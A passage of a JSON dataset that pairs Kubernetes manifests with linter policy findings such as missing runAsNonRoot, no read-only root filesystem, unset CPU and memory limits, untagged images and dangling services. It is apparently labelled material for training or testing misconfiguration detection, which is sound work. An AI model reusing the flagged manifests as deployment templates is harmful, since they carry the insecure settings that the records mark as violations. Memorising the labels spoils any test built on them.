    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: alekseybb/paymentservice:v0.0.2\n        resources: {}\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "8308",
    "manifest_path": "data/manifests/the_stack_sample/sample_3096.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: alekseybb/paymentservice:v0.0.2\n        resources: {}\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "8309",
    "manifest_path": "data/manifests/the_stack_sample/sample_3097.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-test-1\nspec:\n  containers:\n  - name: foobar\n    image: foo/bar:123\n    imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"foobar\" does not have a read-only root file system"
  },
  {
    "id": "8310",
    "manifest_path": "data/manifests/the_stack_sample/sample_3097.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-test-1\nspec:\n  containers:\n  - name: foobar\n    image: foo/bar:123\n    imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"foobar\" is not set to runAsNonRoot"
  },
  {
    "id": "8311",
    "manifest_path": "data/manifests/the_stack_sample/sample_3097.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-test-1\nspec:\n  containers:\n  - name: foobar\n    image: foo/bar:123\n    imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"foobar\" has cpu request 0"
  },
  {
    "id": "8312",
    "manifest_path": "data/manifests/the_stack_sample/sample_3097.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-test-1\nspec:\n  containers:\n  - name: foobar\n    image: foo/bar:123\n    imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"foobar\" has memory limit 0"
  },
  {
    "id": "8313",
    "manifest_path": "data/manifests/the_stack_sample/sample_3098.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test\n  namespace: opa-test\n  labels:\n    app: test\n    owner: jimmy\nspec:\n  selector:\n    matchLabels:\n      app: test\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: test\n        owner: jimmy\n        env: dev\n      annotations:\n        iam.amazonaws.com/role: arn:aws:iam::123456789012:role/test\n    spec:\n      containers:\n      - name: test\n        image: GOOD_REGISTRY/read-only-container:v0.0.1\n        imagePullPolicy: Always\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 200m\n            memory: 20Mi\n          requests:\n            cpu: 100m\n            memory: 10Mi\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        volumeMounts:\n        - mountPath: /tmp\n          name: tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test\" does not have a read-only root file system"
  },
  {
    "id": "8314",
    "manifest_path": "data/manifests/the_stack_sample/sample_3098.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test\n  namespace: opa-test\n  labels:\n    app: test\n    owner: jimmy\nspec:\n  selector:\n    matchLabels:\n      app: test\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: test\n        owner: jimmy\n        env: dev\n      annotations:\n        iam.amazonaws.com/role: arn:aws:iam::123456789012:role/test\n    spec:\n      containers:\n      - name: test\n        image: GOOD_REGISTRY/read-only-container:v0.0.1\n        imagePullPolicy: Always\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 200m\n            memory: 20Mi\n          requests:\n            cpu: 100m\n            memory: 10Mi\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        volumeMounts:\n        - mountPath: /tmp\n          name: tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test\" is not set to runAsNonRoot"
  },
  {
    "id": "8315",
    "manifest_path": "data/manifests/the_stack_sample/sample_3100.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: comment\n  labels:\n    app: reddit\n    component: comment\nspec:\n  ports:\n  - port: 9292\n    protocol: TCP\n    targetPort: 9292\n  selector:\n    app: reddit\n    component: comment\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:reddit component:comment])"
  },
  {
    "id": "8316",
    "manifest_path": "data/manifests/the_stack_sample/sample_3101.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      myApp: mongodb\n  template:\n    metadata:\n      labels:\n        myApp: mongodb\n    spec:\n      containers:\n      - name: mongodb\n        image: mongo:3.6.5-jessie\n        volumeMounts:\n        - name: mongo-persistant-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistant-storage\n        hostPath:\n          path: /mnt/some/directory/structure/\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongodb\" does not have a read-only root file system"
  },
  {
    "id": "8317",
    "manifest_path": "data/manifests/the_stack_sample/sample_3101.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      myApp: mongodb\n  template:\n    metadata:\n      labels:\n        myApp: mongodb\n    spec:\n      containers:\n      - name: mongodb\n        image: mongo:3.6.5-jessie\n        volumeMounts:\n        - name: mongo-persistant-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistant-storage\n        hostPath:\n          path: /mnt/some/directory/structure/\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongodb\" is not set to runAsNonRoot"
  },
  {
    "id": "8318",
    "manifest_path": "data/manifests/the_stack_sample/sample_3101.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      myApp: mongodb\n  template:\n    metadata:\n      labels:\n        myApp: mongodb\n    spec:\n      containers:\n      - name: mongodb\n        image: mongo:3.6.5-jessie\n        volumeMounts:\n        - name: mongo-persistant-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistant-storage\n        hostPath:\n          path: /mnt/some/directory/structure/\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongodb\" has cpu request 0"
  },
  {
    "id": "8319",
    "manifest_path": "data/manifests/the_stack_sample/sample_3101.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      myApp: mongodb\n  template:\n    metadata:\n      labels:\n        myApp: mongodb\n    spec:\n      containers:\n      - name: mongodb\n        image: mongo:3.6.5-jessie\n        volumeMounts:\n        - name: mongo-persistant-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistant-storage\n        hostPath:\n          path: /mnt/some/directory/structure/\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongodb\" has memory limit 0"
  },
  {
    "id": "8320",
    "manifest_path": "data/manifests/the_stack_sample/sample_3102.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: scheduler\n  labels:\n    app: scheduler\nspec:\n  containers:\n  - name: scheduler\n    image: localhost:5000/scheduler\n    imagePullPolicy: Always\n    ports:\n    - name: app\n      containerPort: 3000\n    env:\n    - name: SENDER_API_URL\n      value: http://sender/\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"scheduler\" is using an invalid container image, \"localhost:5000/scheduler\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8321",
    "manifest_path": "data/manifests/the_stack_sample/sample_3102.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: scheduler\n  labels:\n    app: scheduler\nspec:\n  containers:\n  - name: scheduler\n    image: localhost:5000/scheduler\n    imagePullPolicy: Always\n    ports:\n    - name: app\n      containerPort: 3000\n    env:\n    - name: SENDER_API_URL\n      value: http://sender/\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"scheduler\" does not have a read-only root file system"
  },
  {
    "id": "8322",
    "manifest_path": "data/manifests/the_stack_sample/sample_3102.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: scheduler\n  labels:\n    app: scheduler\nspec:\n  containers:\n  - name: scheduler\n    image: localhost:5000/scheduler\n    imagePullPolicy: Always\n    ports:\n    - name: app\n      containerPort: 3000\n    env:\n    - name: SENDER_API_URL\n      value: http://sender/\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"scheduler\" is not set to runAsNonRoot"
  },
  {
    "id": "8323",
    "manifest_path": "data/manifests/the_stack_sample/sample_3102.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: scheduler\n  labels:\n    app: scheduler\nspec:\n  containers:\n  - name: scheduler\n    image: localhost:5000/scheduler\n    imagePullPolicy: Always\n    ports:\n    - name: app\n      containerPort: 3000\n    env:\n    - name: SENDER_API_URL\n      value: http://sender/\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"scheduler\" has cpu request 0"
  },
  {
    "id": "8324",
    "manifest_path": "data/manifests/the_stack_sample/sample_3102.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: scheduler\n  labels:\n    app: scheduler\nspec:\n  containers:\n  - name: scheduler\n    image: localhost:5000/scheduler\n    imagePullPolicy: Always\n    ports:\n    - name: app\n      containerPort: 3000\n    env:\n    - name: SENDER_API_URL\n      value: http://sender/\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"scheduler\" has memory limit 0"
  },
  {
    "id": "8325",
    "manifest_path": "data/manifests/the_stack_sample/sample_3106.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ui-post\n  labels:\n    app: reddit\n    component: post\nspec:\n  ports:\n  - port: 5000\n    protocol: TCP\n    targetPort: 5000\n  selector:\n    app: reddit\n    component: post\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:reddit component:post])"
  },
  {
    "id": "8326",
    "manifest_path": "data/manifests/the_stack_sample/sample_3107.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pv-extract-totvs\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: pv-extract-totvs\n          image: pontusvisiongdpr/pv-extract-wrapper:1.13.2\n          env:\n          - name: PV_TIMEOUT_MS\n            value: '15000'\n          - name: PV_GRAPHDB_URL_PREFIX\n            value: http://graphdb-nifi:3001\n          - name: PV_SECRET_MANAGER_ID\n            value: /run/secrets/totvs-json\n          - name: PV_REQUEST_URL\n            value: https://protheus-ws.sunnyvale.com.br:8009/pontusvision/pontusvision-lgpd-totvs-proteus/1.0.0/sa1_cliente/objs\n          imagePullPolicy: Always\n          command:\n          - /usr/bin/node\n          - dist/rest-handler/totvs/app.js\n          volumeMounts:\n          - mountPath: /run/secrets/totvs-json\n            subPath: totvs-json\n            name: totvs-json\n          - mountPath: /mnt/pv-extract-sharepoint-lambda/\n            name: pontus-extract-totvs-claim0\n        volumes:\n        - name: totvs-json\n          secret:\n            secretName: totvs-json\n        - name: pontus-extract-totvs-claim0\n          persistentVolumeClaim:\n            claimName: pontus-extract-totvs-claim0\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable PV_SECRET_MANAGER_ID in container \"pv-extract-totvs\" found"
  },
  {
    "id": "8327",
    "manifest_path": "data/manifests/the_stack_sample/sample_3107.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pv-extract-totvs\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: pv-extract-totvs\n          image: pontusvisiongdpr/pv-extract-wrapper:1.13.2\n          env:\n          - name: PV_TIMEOUT_MS\n            value: '15000'\n          - name: PV_GRAPHDB_URL_PREFIX\n            value: http://graphdb-nifi:3001\n          - name: PV_SECRET_MANAGER_ID\n            value: /run/secrets/totvs-json\n          - name: PV_REQUEST_URL\n            value: https://protheus-ws.sunnyvale.com.br:8009/pontusvision/pontusvision-lgpd-totvs-proteus/1.0.0/sa1_cliente/objs\n          imagePullPolicy: Always\n          command:\n          - /usr/bin/node\n          - dist/rest-handler/totvs/app.js\n          volumeMounts:\n          - mountPath: /run/secrets/totvs-json\n            subPath: totvs-json\n            name: totvs-json\n          - mountPath: /mnt/pv-extract-sharepoint-lambda/\n            name: pontus-extract-totvs-claim0\n        volumes:\n        - name: totvs-json\n          secret:\n            secretName: totvs-json\n        - name: pontus-extract-totvs-claim0\n          persistentVolumeClaim:\n            claimName: pontus-extract-totvs-claim0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pv-extract-totvs\" does not have a read-only root file system"
  },
  {
    "id": "8328",
    "manifest_path": "data/manifests/the_stack_sample/sample_3107.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pv-extract-totvs\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: pv-extract-totvs\n          image: pontusvisiongdpr/pv-extract-wrapper:1.13.2\n          env:\n          - name: PV_TIMEOUT_MS\n            value: '15000'\n          - name: PV_GRAPHDB_URL_PREFIX\n            value: http://graphdb-nifi:3001\n          - name: PV_SECRET_MANAGER_ID\n            value: /run/secrets/totvs-json\n          - name: PV_REQUEST_URL\n            value: https://protheus-ws.sunnyvale.com.br:8009/pontusvision/pontusvision-lgpd-totvs-proteus/1.0.0/sa1_cliente/objs\n          imagePullPolicy: Always\n          command:\n          - /usr/bin/node\n          - dist/rest-handler/totvs/app.js\n          volumeMounts:\n          - mountPath: /run/secrets/totvs-json\n            subPath: totvs-json\n            name: totvs-json\n          - mountPath: /mnt/pv-extract-sharepoint-lambda/\n            name: pontus-extract-totvs-claim0\n        volumes:\n        - name: totvs-json\n          secret:\n            secretName: totvs-json\n        - name: pontus-extract-totvs-claim0\n          persistentVolumeClaim:\n            claimName: pontus-extract-totvs-claim0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pv-extract-totvs\" is not set to runAsNonRoot"
  },
  {
    "id": "8329",
    "manifest_path": "data/manifests/the_stack_sample/sample_3107.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pv-extract-totvs\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: pv-extract-totvs\n          image: pontusvisiongdpr/pv-extract-wrapper:1.13.2\n          env:\n          - name: PV_TIMEOUT_MS\n            value: '15000'\n          - name: PV_GRAPHDB_URL_PREFIX\n            value: http://graphdb-nifi:3001\n          - name: PV_SECRET_MANAGER_ID\n            value: /run/secrets/totvs-json\n          - name: PV_REQUEST_URL\n            value: https://protheus-ws.sunnyvale.com.br:8009/pontusvision/pontusvision-lgpd-totvs-proteus/1.0.0/sa1_cliente/objs\n          imagePullPolicy: Always\n          command:\n          - /usr/bin/node\n          - dist/rest-handler/totvs/app.js\n          volumeMounts:\n          - mountPath: /run/secrets/totvs-json\n            subPath: totvs-json\n            name: totvs-json\n          - mountPath: /mnt/pv-extract-sharepoint-lambda/\n            name: pontus-extract-totvs-claim0\n        volumes:\n        - name: totvs-json\n          secret:\n            secretName: totvs-json\n        - name: pontus-extract-totvs-claim0\n          persistentVolumeClaim:\n            claimName: pontus-extract-totvs-claim0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pv-extract-totvs\" has cpu request 0"
  },
  {
    "id": "8330",
    "manifest_path": "data/manifests/the_stack_sample/sample_3107.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pv-extract-totvs\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: pv-extract-totvs\n          image: pontusvisiongdpr/pv-extract-wrapper:1.13.2\n          env:\n          - name: PV_TIMEOUT_MS\n            value: '15000'\n          - name: PV_GRAPHDB_URL_PREFIX\n            value: http://graphdb-nifi:3001\n          - name: PV_SECRET_MANAGER_ID\n            value: /run/secrets/totvs-json\n          - name: PV_REQUEST_URL\n            value: https://protheus-ws.sunnyvale.com.br:8009/pontusvision/pontusvision-lgpd-totvs-proteus/1.0.0/sa1_cliente/objs\n          imagePullPolicy: Always\n          command:\n          - /usr/bin/node\n          - dist/rest-handler/totvs/app.js\n          volumeMounts:\n          - mountPath: /run/secrets/totvs-json\n            subPath: totvs-json\n            name: totvs-json\n          - mountPath: /mnt/pv-extract-sharepoint-lambda/\n            name: pontus-extract-totvs-claim0\n        volumes:\n        - name: totvs-json\n          secret:\n            secretName: totvs-json\n        - name: pontus-extract-totvs-claim0\n          persistentVolumeClaim:\n            claimName: pontus-extract-totvs-claim0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pv-extract-totvs\" has memory limit 0"
  },
  {
    "id": "8331",
    "manifest_path": "data/manifests/the_stack_sample/sample_3108.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smart-gateway-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: smart-gateway-operator\n  template:\n    metadata:\n      labels:\n        name: smart-gateway-operator\n    spec:\n      serviceAccountName: smart-gateway-operator\n      containers:\n      - name: smart-gateway-operator\n        image: smart-gateway-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: smart-gateway-operator\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"smart-gateway-operator\" is using an invalid container image, \"smart-gateway-operator\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8332",
    "manifest_path": "data/manifests/the_stack_sample/sample_3108.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smart-gateway-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: smart-gateway-operator\n  template:\n    metadata:\n      labels:\n        name: smart-gateway-operator\n    spec:\n      serviceAccountName: smart-gateway-operator\n      containers:\n      - name: smart-gateway-operator\n        image: smart-gateway-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: smart-gateway-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"smart-gateway-operator\" does not have a read-only root file system"
  },
  {
    "id": "8333",
    "manifest_path": "data/manifests/the_stack_sample/sample_3108.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smart-gateway-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: smart-gateway-operator\n  template:\n    metadata:\n      labels:\n        name: smart-gateway-operator\n    spec:\n      serviceAccountName: smart-gateway-operator\n      containers:\n      - name: smart-gateway-operator\n        image: smart-gateway-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: smart-gateway-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"smart-gateway-operator\" not found"
  },
  {
    "id": "8334",
    "manifest_path": "data/manifests/the_stack_sample/sample_3108.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smart-gateway-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: smart-gateway-operator\n  template:\n    metadata:\n      labels:\n        name: smart-gateway-operator\n    spec:\n      serviceAccountName: smart-gateway-operator\n      containers:\n      - name: smart-gateway-operator\n        image: smart-gateway-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: smart-gateway-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"smart-gateway-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "8335",
    "manifest_path": "data/manifests/the_stack_sample/sample_3108.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smart-gateway-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: smart-gateway-operator\n  template:\n    metadata:\n      labels:\n        name: smart-gateway-operator\n    spec:\n      serviceAccountName: smart-gateway-operator\n      containers:\n      - name: smart-gateway-operator\n        image: smart-gateway-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: smart-gateway-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"smart-gateway-operator\" has cpu request 0"
  },
  {
    "id": "8336",
    "manifest_path": "data/manifests/the_stack_sample/sample_3108.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smart-gateway-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: smart-gateway-operator\n  template:\n    metadata:\n      labels:\n        name: smart-gateway-operator\n    spec:\n      serviceAccountName: smart-gateway-operator\n      containers:\n      - name: smart-gateway-operator\n        image: smart-gateway-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: smart-gateway-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"smart-gateway-operator\" has memory limit 0"
  },
  {
    "id": "8337",
    "manifest_path": "data/manifests/the_stack_sample/sample_3110.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeker-qualifiers-nrfin00019-pov0\n  labels:\n    type: cyborg-seeker\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeker-qualifiers-nrfin00019-pov0\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeker.py qualifiers NRFIN_00019\n      pov_0 3600\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cyborg-seeker-qualifiers-nrfin00019-pov0\" does not have a read-only root file system"
  },
  {
    "id": "8338",
    "manifest_path": "data/manifests/the_stack_sample/sample_3110.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeker-qualifiers-nrfin00019-pov0\n  labels:\n    type: cyborg-seeker\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeker-qualifiers-nrfin00019-pov0\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeker.py qualifiers NRFIN_00019\n      pov_0 3600\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cyborg-seeker-qualifiers-nrfin00019-pov0\" is not set to runAsNonRoot"
  },
  {
    "id": "8339",
    "manifest_path": "data/manifests/the_stack_sample/sample_3111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kafka-bench-consumer\nspec:\n  containers:\n  - name: consumer\n    image: quay.io/ibm/kar-kafka-bench\n    command:\n    - /kar/bin/consumer\n    env:\n    - name: KAFKA_BROKERS\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_brokers\n    - name: KAFKA_ENABLE_TLS\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_enable_tls\n    - name: KAFKA_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_password\n    - name: KAFKA_VERSION\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_version\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"consumer\" is using an invalid container image, \"quay.io/ibm/kar-kafka-bench\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8340",
    "manifest_path": "data/manifests/the_stack_sample/sample_3111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kafka-bench-consumer\nspec:\n  containers:\n  - name: consumer\n    image: quay.io/ibm/kar-kafka-bench\n    command:\n    - /kar/bin/consumer\n    env:\n    - name: KAFKA_BROKERS\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_brokers\n    - name: KAFKA_ENABLE_TLS\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_enable_tls\n    - name: KAFKA_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_password\n    - name: KAFKA_VERSION\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_version\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"consumer\" does not have a read-only root file system"
  },
  {
    "id": "8341",
    "manifest_path": "data/manifests/the_stack_sample/sample_3111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kafka-bench-consumer\nspec:\n  containers:\n  - name: consumer\n    image: quay.io/ibm/kar-kafka-bench\n    command:\n    - /kar/bin/consumer\n    env:\n    - name: KAFKA_BROKERS\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_brokers\n    - name: KAFKA_ENABLE_TLS\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_enable_tls\n    - name: KAFKA_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_password\n    - name: KAFKA_VERSION\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_version\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"consumer\" is not set to runAsNonRoot"
  },
  {
    "id": "8342",
